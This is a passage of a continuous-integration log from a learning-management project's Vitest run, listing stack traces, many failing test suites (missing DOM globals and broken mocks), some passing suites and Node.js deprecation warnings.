2025-11-18T17:35:46.5856409Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:46.5857581Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5858496Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5859386Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5860562Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:46.5862347Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:46.5864476Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:46.5865888Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:46.5866529Z 
2025-11-18T17:35:46.5868559Z [90mstderr[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould handle path with no courses correctly[22m[39m
2025-11-18T17:35:46.5870535Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: assignmentQuery.maybeSingle is not a function
2025-11-18T17:35:46.5872342Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:549:82[90m)[39m
2025-11-18T17:35:46.5873887Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/services/learningPathsService.spec.ts:187:22
2025-11-18T17:35:46.5875329Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:46.5877302Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5878900Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5880442Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:46.5881976Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:46.5883530Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:46.5884888Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
2025-11-18T17:35:46.5886219Z     at withEnv [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:73:5[90m)[39m
2025-11-18T17:35:46.5887842Z 
2025-11-18T17:35:46.5889619Z [90mstderr[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould throw error when learning path not found[22m[39m
2025-11-18T17:35:46.5891727Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: assignmentQuery.maybeSingle is not a function
2025-11-18T17:35:46.5893661Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:549:82[90m)[39m
2025-11-18T17:35:46.5894553Z 
2025-11-18T17:35:46.5896186Z [90mstderr[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould handle RPC database errors gracefully[22m[39m
2025-11-18T17:35:46.5898728Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: assignmentQuery.maybeSingle is not a function
2025-11-18T17:35:46.5900647Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:549:82[90m)[39m
2025-11-18T17:35:46.5901545Z 
2025-11-18T17:35:46.5902562Z  [33m❯[39m __tests__/services/learningPathsService.spec.ts [2m ([22m[2m8 tests[22m [2m|[22m [31m4 failed[39m[2m)[22m[90m 26[2mms[22m[39m
2025-11-18T17:35:46.5905147Z [31m   [33m❯[31m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould return complete path details with progress when RPC succeeds[39m
2025-11-18T17:35:46.5907397Z [31m     → Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function[39m
2025-11-18T17:35:46.5909588Z [31m   [33m❯[31m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould handle path with no courses correctly[39m
2025-11-18T17:35:46.5911461Z [31m     → Failed to fetch learning path details: assignmentQuery.maybeSingle is not a function[39m
2025-11-18T17:35:46.5913849Z [31m   [33m❯[31m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould throw error when learning path not found[39m
2025-11-18T17:35:46.5916024Z [31m     → expected [Function] to throw error including 'Learning path not found' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:35:46.5918486Z [31m   [33m❯[31m __tests__/services/learningPathsService.spec.ts[2m > [22mLearningPathsService[2m > [22mgetLearningPathDetailsForUser[2m > [22mshould handle RPC database errors gracefully[39m
2025-11-18T17:35:46.5920639Z [31m     → expected [Function] to throw error including 'Failed to fetch learning path details…' but got 'Failed to fetch learning path details…'[39m
2025-11-18T17:35:46.5923174Z [90mstdout[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould return complete path details with progress when RPC succeeds[22m[39m
2025-11-18T17:35:46.5924898Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:46.5925374Z 
2025-11-18T17:35:46.5927204Z [90mstdout[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould handle path with no courses correctly[22m[39m
2025-11-18T17:35:46.5928823Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:46.5929288Z 
2025-11-18T17:35:46.5930902Z [90mstdout[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould throw error when learning path not found[22m[39m
2025-11-18T17:35:46.5932502Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:46.5932959Z 
2025-11-18T17:35:46.5934543Z [90mstdout[2m | __tests__/services/learningPathsService.spec.ts[2m > [22m[2mLearningPathsService[2m > [22m[2mgetLearningPathDetailsForUser[2m > [22m[2mshould handle RPC database errors gracefully[22m[39m
2025-11-18T17:35:46.5936107Z [LearningPathsService] Getting path details for user user-123, path path-456
2025-11-18T17:35:46.5936572Z 
2025-11-18T17:35:47.0508348Z  [33m❯[39m __tests__/integration/feedback-system.test.ts [2m ([22m[2m15 tests[22m[2m)[22m[90m 27[2mms[22m[39m
2025-11-18T17:35:47.0541643Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:47.0543857Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:47.0545602Z 
2025-11-18T17:35:47.5812593Z  [33m❯[39m __tests__/integration/password-reset-flow.test.tsx [2m ([22m[2m6 tests[22m [2m|[22m [31m6 failed[39m[2m)[22m[90m 12[2mms[22m[39m
2025-11-18T17:35:47.5815473Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to change-password when password_change_required is true[39m
2025-11-18T17:35:47.5817491Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5818436Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.5820731Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to profile if password is OK but profile incomplete[39m
2025-11-18T17:35:47.5822482Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5823378Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.5826981Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould show admin reset message when password_reset_by_admin is true[39m
2025-11-18T17:35:47.5829494Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5830051Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.5831262Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould update password and clear flags on successful change[39m
2025-11-18T17:35:47.5832186Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5832723Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.5833800Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould enforce password requirements[39m
2025-11-18T17:35:47.5834664Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5835176Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.5836342Z [31m   [33m❯[31m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould redirect to dashboard if password change not required[39m
2025-11-18T17:35:47.5838157Z [31m     → vi.mocked(...).mockReturnValue is not a function[39m
2025-11-18T17:35:47.5839187Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:47.9799064Z  [32m✓[39m __tests__/utils/passwordGenerator.test.ts [2m ([22m[2m32 tests[22m[2m)[22m[90m 33[2mms[22m[39m
2025-11-18T17:35:48.3951767Z  [32m✓[39m __tests__/lessonNavigationService.test.ts [2m ([22m[2m10 tests[22m[2m)[22m[90m 22[2mms[22m[39m
2025-11-18T17:35:48.7979318Z  [32m✓[39m __tests__/lib/temporaryPasswordStore.test.ts [2m ([22m[2m21 tests[22m[2m)[22m[90m 33[2mms[22m[39m
2025-11-18T17:35:49.2660000Z  [33m❯[39m __tests__/StudentBlockRenderer.quiz.test.tsx [2m ([22m[2m13 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 24[2mms[22m[39m
2025-11-18T17:35:49.2664147Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould render LearningQuizTaker when all required props are provided[39m
2025-11-18T17:35:49.2665958Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2667482Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould pass correct props to LearningQuizTaker[39m
2025-11-18T17:35:49.2668779Z [31m     → vi.requireMock is not a function[39m
2025-11-18T17:35:49.2669990Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback message when required props are missing[39m
2025-11-18T17:35:49.2670876Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2671947Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when lessonId is missing[39m
2025-11-18T17:35:49.2672756Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2673826Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when courseId is missing[39m
2025-11-18T17:35:49.2674647Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2675853Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Rendering with Required Props[2m > [22mshould show fallback when studentId is missing[39m
2025-11-18T17:35:49.2677600Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2679803Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould call onComplete with correct data when quiz is completed[39m
2025-11-18T17:35:49.2681460Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2683256Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould not show scores in completion data[39m
2025-11-18T17:35:49.2684594Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2686496Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mQuiz Completion Handling[2m > [22mshould show completion status when quiz is already completed[39m
2025-11-18T17:35:49.2688157Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2689782Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mAdmin Mode[2m > [22mshould render quiz for admin users[39m
2025-11-18T17:35:49.2691049Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2692701Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mDifferent Quiz Types[2m > [22mshould handle quiz with no title[39m
2025-11-18T17:35:49.2694021Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2695739Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mDifferent Quiz Types[2m > [22mshould handle quiz with mixed question types[39m
2025-11-18T17:35:49.2697243Z [31m     → document is not defined[39m
2025-11-18T17:35:49.2698949Z [31m   [33m❯[31m __tests__/StudentBlockRenderer.quiz.test.tsx[2m > [22mStudentBlockRenderer - Quiz Block[2m > [22mProgress Tracking[2m > [22mshould track time spent on quiz[39m
2025-11-18T17:35:49.2700209Z [31m     → document is not defined[39m
2025-11-18T17:35:49.6580015Z  [32m✓[39m tests/workspace/discussionCountsIntegration.test.ts [2m ([22m[2m7 tests[22m[2m)[22m[90m 21[2mms[22m[39m
2025-11-18T17:35:50.1196065Z [90mstdout[2m | unknown test[22m[39m
2025-11-18T17:35:50.1197885Z ✅ Enhanced Progress Indicators component tests completed
2025-11-18T17:35:50.1198756Z 
2025-11-18T17:35:50.1202844Z  [33m❯[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx [2m ([22m[2m11 tests[22m [2m|[22m [31m11 failed[39m[2m)[22m[90m 19[2mms[22m[39m
2025-11-18T17:35:50.1207649Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould render progress overview with key metrics[39m
2025-11-18T17:35:50.1208526Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1209573Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display pace analysis correctly[39m
2025-11-18T17:35:50.1210390Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1211411Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display engagement level information[39m
2025-11-18T17:35:50.1212207Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1213161Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show time forecasting[39m
2025-11-18T17:35:50.1213900Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1215064Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display milestones correctly[39m
2025-11-18T17:35:50.1215854Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1217438Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show study pattern analysis[39m
2025-11-18T17:35:50.1218987Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1220847Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display motivational metrics[39m
2025-11-18T17:35:50.1222266Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1224025Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould show peer comparison when available[39m
2025-11-18T17:35:50.1225392Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1227235Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display recommendations[39m
2025-11-18T17:35:50.1228548Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1230232Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould handle at-risk status[39m
2025-11-18T17:35:50.1231688Z [31m     → document is not defined[39m
2025-11-18T17:35:50.1233538Z [31m   [33m❯[31m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould handle missing optional data gracefully[39m
2025-11-18T17:35:50.1234982Z [31m     → document is not defined[39m
2025-11-18T17:35:50.5046571Z  [33m❯[39m __tests__/api/admin/networks.test.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:51.1514578Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:51.1517252Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:51.1518582Z 
2025-11-18T17:35:51.2964797Z  [33m❯[39m __tests__/auth/authentication-flow.test.tsx [2m ([22m[2m12 tests[22m [2m|[22m [31m12 failed[39m[2m)[22m[90m 33[2mms[22m[39m
2025-11-18T17:35:51.2966421Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as admin[39m
2025-11-18T17:35:51.2967833Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2968772Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as consultor[39m
2025-11-18T17:35:51.2969483Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2970421Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as equipo_directivo[39m
2025-11-18T17:35:51.2971155Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2972082Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as lider_generacion[39m
2025-11-18T17:35:51.2972797Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2974303Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as lider_comunidad[39m
2025-11-18T17:35:51.2975726Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2977561Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould successfully login as docente[39m
2025-11-18T17:35:51.2979145Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2980661Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogin Flow[2m > [22mshould handle "Remember Me" functionality[39m
2025-11-18T17:35:51.2981787Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2983439Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mSession Persistence[2m > [22mshould maintain session across page refreshes[39m
2025-11-18T17:35:51.2984704Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2986316Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mSession Persistence[2m > [22mshould handle token refresh before expiry[39m
2025-11-18T17:35:51.2987794Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2989350Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mLogout Flow[2m > [22mshould successfully logout and clear session[39m
2025-11-18T17:35:51.2990629Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2992285Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mError Handling[2m > [22mshould handle network errors gracefully[39m
2025-11-18T17:35:51.2993559Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.2995177Z [31m   [33m❯[31m __tests__/auth/authentication-flow.test.tsx[2m > [22mAuthentication Flow Tests[2m > [22mError Handling[2m > [22mshould handle invalid credentials[39m
2025-11-18T17:35:51.2996403Z [31m     → localStorage is not defined[39m
2025-11-18T17:35:51.7848116Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:51.7854761Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:51.7856507Z 
2025-11-18T17:35:51.8157932Z  [33m❯[39m __tests__/api/learning-paths/search-assignees.test.ts [2m ([22m[2m7 tests[22m [2m|[22m [31m7 failed[39m[2m)[22m[90m 10[2mms[22m[39m
2025-11-18T17:35:51.8162597Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould return 405 for non-POST requests[39m
2025-11-18T17:35:51.8163669Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8165093Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould require authentication[39m
2025-11-18T17:35:51.8165985Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8167298Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould check user permissions[39m
2025-11-18T17:35:51.8168183Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8169194Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould validate required parameters[39m
2025-11-18T17:35:51.8170064Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8171177Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould return filtered user results with assignment status[39m
2025-11-18T17:35:51.8172689Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8174690Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould handle pagination correctly[39m
2025-11-18T17:35:51.8176667Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:51.8178636Z [31m   [33m❯[31m __tests__/api/learning-paths/search-assignees.test.ts[2m > [22m/api/learning-paths/search-assignees[2m > [22mshould handle empty search results[39m
2025-11-18T17:35:51.8180063Z [31m     → createApiSupabaseClient.mockResolvedValue is not a function[39m
2025-11-18T17:35:52.5731813Z  [33m❯[39m e2e/tests/supervisor_feature.spec.ts [2m ([22m[2m0 test[22m[2m)[22m
2025-11-18T17:35:53.0093460Z  [32m✓[39m __tests__/utils/parseAreaQuestions.test.ts [2m ([22m[2m14 tests[22m[2m)[22m[90m 54[2mms[22m[39m
2025-11-18T17:35:53.5411707Z  [33m❯[39m __tests__/components/feedback/FeedbackDetail.test.tsx [2m ([22m[2m17 tests[22m [2m|[22m [31m17 failed[39m[2m)[22m[90m 29[2mms[22m[39m
2025-11-18T17:35:53.5415033Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not render when not open[39m
2025-11-18T17:35:53.5416448Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5417613Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5419128Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mrenders when open[39m
2025-11-18T17:35:53.5420209Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5421126Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5422551Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays feedback information[39m
2025-11-18T17:35:53.5423620Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5424382Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5425334Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for bug type[39m
2025-11-18T17:35:53.5426012Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5426490Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5427689Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for idea type[39m
2025-11-18T17:35:53.5428338Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5428799Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5430042Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays screenshot when present[39m
2025-11-18T17:35:53.5430682Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5431131Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5432952Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not display screenshot section when not present[39m
2025-11-18T17:35:53.5434346Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5435264Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5437457Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays browser info in collapsible section[39m
2025-11-18T17:35:53.5438697Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5439451Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5441008Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows status action buttons based on current status[39m
2025-11-18T17:35:53.5442115Z [31m     → document is not defined[39m
2025-11-18T17:35:53.5442893Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5444746Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcalls onStatusUpdate when status button is clicked[39m
2025-11-18T17:35:53.5446456Z [31m     → Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:35:53.5447816Z [31m     → Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:35:53.5449247Z [31m   [33m❯[31m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays comment input[39m
